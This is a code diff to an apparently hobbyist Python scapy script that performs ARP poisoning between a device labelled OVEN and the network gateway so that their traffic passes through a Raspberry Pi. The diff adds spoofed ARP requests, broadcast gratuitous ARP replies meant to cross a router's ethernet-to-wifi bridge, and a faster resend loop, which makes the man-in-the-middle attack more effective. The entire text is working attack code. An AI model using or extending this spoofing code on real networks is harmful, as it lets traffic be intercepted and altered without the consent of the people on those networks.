@@ -252,11 +252,19 @@ def main():
             log("info", f"any oven packets seen at Pi in ~4s: {n2}")
     threading.Thread(target=diag, daemon=True).start()
 
-    def poison(a,am,sp): sendp(Ether(dst=am)/ARP(op=2,pdst=a,hwdst=am,psrc=sp,hwsrc=my_mac),iface=iface)
+    def poison(a,am,sp):
+        # directed ARP reply AND a spoofed ARP request (some stacks only cache from requests)
+        sendp(Ether(dst=am)/ARP(op=2,pdst=a,hwdst=am,psrc=sp,hwsrc=my_mac),iface=iface)
+        sendp(Ether(dst=am)/ARP(op=1,pdst=a,hwdst=am,psrc=sp,hwsrc=my_mac),iface=iface)
     def heal(a,am,rp,rm): sendp(Ether(dst=am)/ARP(op=2,pdst=a,hwdst=am,psrc=rp,hwsrc=rm),iface=iface)
     def spoof():
         while not stop.is_set():
-            poison(OVEN,oven_mac,GW); poison(GW,gw_mac,OVEN); time.sleep(1)
+            poison(OVEN,oven_mac,GW); poison(GW,gw_mac,OVEN)
+            # broadcast gratuitous replies too, in case directed frames don't cross the
+            # ethernet<->wifi bridge in the router
+            sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,pdst=OVEN,psrc=GW,hwsrc=my_mac),iface=iface)
+            sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,pdst=GW,psrc=OVEN,hwsrc=my_mac),iface=iface)
+            time.sleep(0.5)
     threading.Thread(target=spoof, daemon=True).start()
 
     def cleanup(*_):
